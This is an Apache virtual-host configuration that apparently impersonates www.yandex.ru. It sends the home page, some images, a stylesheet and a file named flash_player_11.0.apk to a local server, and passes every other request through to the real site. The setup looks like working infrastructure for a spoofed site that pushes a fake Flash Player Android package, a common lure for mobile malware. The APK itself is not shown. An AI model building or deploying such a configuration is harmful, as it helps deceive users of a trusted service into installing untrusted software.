<VirtualHost *:80>
    ServerName www.yandex.ru

    <Proxy *>
	Order allow,deny
        Allow from all
    </Proxy> 
    
    ProxyPassMatch ^/$ http://127.0.0.1:8000/
    ProxyPassMatch ^/1.gif$ http://127.0.0.1:8000/
    ProxyPassMatch ^/but.png$ http://127.0.0.1:8000/
    ProxyPassMatch ^/flash_player_11.0.apk$ http://127.0.0.1:8000/
    ProxyPassMatch ^/logo.png$ http://127.0.0.1:8000/
    ProxyPassMatch ^/style.css$ http://127.0.0.1:8000/
    ProxyPassMatch ^/(.*)$ http://www.yandex.ru/$1
    
    ProxyPassReverse / http://www.yandex.ru/
</VirtualHost>